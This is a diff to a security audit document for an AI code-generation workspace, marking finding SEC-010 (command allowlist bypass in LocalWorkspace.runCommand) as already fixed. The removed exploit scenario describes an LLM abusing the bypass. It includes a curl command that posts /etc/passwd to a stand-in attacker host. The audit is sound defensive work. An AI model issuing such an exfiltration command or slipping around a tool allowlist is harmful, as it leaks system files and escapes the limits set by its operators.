@@ -217,17 +217,17 @@ This is the root of the SEC-02 finding flagged in the previous audit; the wrap w
 ---
 
 ### SEC-010: `LocalWorkspace.runCommand` allowlist is not enforced when `allowedCommands` is `undefined`
-**Severity:** High
+**Severity:** Closed in live checkout
 **OWASP:** LLM07 Insecure Plugin Design
-**Files:** `packages/codegen/src/workspace/local-workspace.ts:210-218`
+**Files:**
+- `packages/codegen/src/workspace/local-workspace.ts:149-165`
+- `packages/codegen/src/workspace/local-workspace.ts:268-272`
 
-**Exploit scenario:** The constructor sets `allowedCommands: options.command?.allowedCommands ?? []`. The check is `if (allowedCommands && !allowedCommands.includes(cmd))` — when `allowedCommands` is the empty array (the safe default), the conditional is truthy and the check fires. Good. But when a host explicitly passes `command: { allowedCommands: undefined }`, the field is **deleted** by the spread (`{ ...options.command, allowedCommands: undefined }`) and the runtime check evaluates to `false`, **skipping the allowlist entirely**. An LLM can then call `workspace.runCommand('curl', ['-X','POST','attacker.com','-d','@/etc/passwd'])` from a `workspace-write` adapter.
+**Live status:** Already fixed. The constructor resolves `options.command?.allowedCommands === undefined` to `DEFAULT_ALLOWED_COMMANDS`, keeps `allowedCommands: '*'` as the only explicit opt-out sentinel, and `runCommand` throws when the command is not in the resolved list.
 
-There is no docstring contract that `allowedCommands === undefined` means "deny everything"; in fact the current code path means "allow everything".
-
-**Fix:** Change the check to `if (!Array.isArray(allowedCommands) || !allowedCommands.includes(cmd))`. Also reject `cmd` containing `..`, `/`, or shell metacharacters. Default to `['rg', 'git', 'ls', 'cat']` rather than `[]` so an empty config still works for read-only flows.
-**Acceptance:** Unit test: `new LocalWorkspace({ rootDir, command: { allowedCommands: undefined } }).runCommand('curl', [])` returns exit 126.
-**Effort:** 1.5h
+**Fix:** No implementation task. Keep this as closed unless a future codegen workspace change regresses it.
+**Acceptance:** Optional regression-only: `new LocalWorkspace({ rootDir, command: { allowedCommands: undefined } }).runCommand('curl', [])` throws `WorkspaceCommandDeniedError`.
+**Effort:** 0h
 
 ---
 
